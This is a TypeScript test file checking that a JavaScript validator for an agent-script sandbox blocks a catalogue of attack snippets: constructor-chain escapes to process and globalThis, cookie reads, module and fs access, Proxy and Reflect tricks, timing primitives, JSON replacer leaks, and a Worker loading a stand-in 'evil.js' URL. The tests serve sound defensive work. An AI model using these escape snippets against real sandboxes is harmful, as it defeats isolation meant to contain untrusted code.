import { JSAstValidator } from '../validator';
import { createAgentScriptPreset } from '../presets/agentscript.preset';

/**
 * AgentScript Attack Matrix Alignment
 *
 * Mirrors critical ATK scenarios from enclave-vm's attack matrix to ensure
 * the AgentScript preset blocks the same primitives before code reaches runtime.
 */
describe('AgentScript Attack Matrix', () => {
  const wrap = (body: string) => `
    async function __ag_main() {
      ${body}
    }
  `;

  const createValidator = () => new JSAstValidator(createAgentScriptPreset());

  const expectBlocked = async (
    validator: JSAstValidator,
    code: string,
    assertion?: (result: Awaited<ReturnType<JSAstValidator['validate']>>) => void,
  ) => {
    const result = await validator.validate(code);
    expect(result.valid).toBe(false);
    if (assertion) {
      assertion(result);
    } else {
      expect(result.issues.length).toBeGreaterThan(0);
    }
  };

  describe('Direct Global Access · ATK-7/8/10', () => {
    it('ATK-7: blocks browser globals like document', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const cookies = document.cookie;
          return cookies;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'UNKNOWN_GLOBAL')).toBe(true);
        },
      );
    });

    it('ATK-8: blocks CommonJS module access (module)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const fs = module.require('fs');
          return fs;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-8: blocks CommonJS module access (exports)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          exports.pwned = true;
          return exports;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-10: blocks dynamic import attempts', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const mod = await import('fs');
          return mod;
        `),
      );
    });
  });

  describe('Constructor Chain Escapes · ATK-3/17/18/32', () => {
    it('ATK-3: blocks Error.constructor.constructor chain', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const runner = new Error().constructor.constructor('return process')();
          return runner;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-18: blocks AsyncFunction constructor access', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const AsyncFn = (async function(){ }).constructor;
          return AsyncFn('return this')();
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-32: blocks optional chaining to constructor', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const obj = {};
          const runner = obj?.constructor?.constructor('return globalThis')();
          return runner;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Stack Trace & Error Object Manipulation · ATK-4', () => {
    it('ATK-4: blocks Error.prepareStackTrace tampering', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          Error.prepareStackTrace = () => 'hacked';
          return Error.prepareStackTrace;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Prototype & Meta-Programming APIs · ATK-24/25/33/35/36', () => {
    it('ATK-25: blocks Object.setPrototypeOf manipulation', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const obj = {};
          Object.setPrototypeOf(obj, Function.prototype);
          return obj;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'NO_META_PROGRAMMING')).toBe(true);
        },
      );
    });

    it('ATK-33: blocks Reflect.get on globals', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const proc = Reflect.get(globalThis, 'process');
          return proc;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-35: blocks Object.getOwnPropertyDescriptor leaks', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const desc = Object.getOwnPropertyDescriptor(globalThis, 'process');
          return desc;
        `),
        (result) => {
          expect(result.issues.some((issue) => ['NO_META_PROGRAMMING', 'NO_GLOBAL_ACCESS'].includes(issue.code))).toBe(
            true,
          );
        },
      );
    });

    it('ATK-36: blocks Proxy constructor usage', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const proxy = new Proxy({}, { get(){ return 'pwned'; } });
          return proxy.value;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Resource Exhaustion & Timing · ATK-41/44/47/48/62-67', () => {
    it('ATK-41: blocks Promise chain storms', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          let chain = Promise.resolve(0);
          chain = chain.then(() => Promise.resolve(1));
          return chain;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-44: blocks access to high-resolution timers', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const value = performance.now();
          return value;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-47/48: blocks SharedArrayBuffer and Atomics usage', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const buf = new SharedArrayBuffer(16);
          const view = new Int32Array(buf);
          Atomics.add(view, 0, 1);
          return view;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Worker & Concurrency Primitives · ATK-65/67/71', () => {
    it('ATK-65: blocks microtask flooding helpers via queueMicrotask', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          queueMicrotask(() => {});
          return 1;
        `),
      );
    });

    it('ATK-67: blocks Worker-based sandbox escapes', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const worker = new Worker('http://example.com/evil.js');
          return worker;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('JSON Callback Attacks · Vector 960', () => {
    it('Vector 960: blocks JSON.stringify with arrow function replacer (Native Walker leak)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const keysFound = [];
          const walker = (key, value) => {
            if (key && key.length > 0) {
              keysFound.push(key);
            }
            return value;
          };
          JSON.stringify(this, walker);
          return keysFound;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.stringify with inline arrow function replacer', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON.stringify({a: 1}, (k, v) => v);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.stringify with function expression replacer', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON.stringify({a: 1}, function(k, v) { return v; });
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.stringify with identifier replacer (variable reference)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const replacer = (k, v) => v;
          const result = JSON.stringify({a: 1}, replacer);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.parse with reviver function', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON.parse('{"a":1}', (k, v) => v);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('allows JSON.stringify without replacer', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.stringify({a: 1});
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });

    it('allows JSON.stringify with null replacer', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.stringify({a: 1}, null, 2);
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });

    it('allows JSON.stringify with array replacer (property allowlist)', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.stringify({a: 1, b: 2}, ['a']);
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });

    it('allows JSON.parse without reviver', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.parse('{"a":1}');
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });
  });
});
